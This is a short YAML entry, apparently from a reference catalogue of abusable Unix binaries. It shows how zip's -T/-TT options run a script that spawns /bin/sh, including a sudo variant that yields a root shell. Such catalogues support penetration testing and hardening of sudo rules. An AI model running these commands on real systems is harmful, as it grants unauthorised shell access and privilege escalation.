---
functions:
  execute-interactive:
    - code: echo "/bin/sh" > /tmp/run.sh
            chmod +x /tmp/run.sh
            zip z.zip * -T -TT /tmp/run.sh
  sudo-enabled:
    - code: echo "/bin/sh" > /tmp/run.sh
            chmod +x /tmp/run.sh
            sudo zip z.zip * -T -TT /tmp/run.sh
---
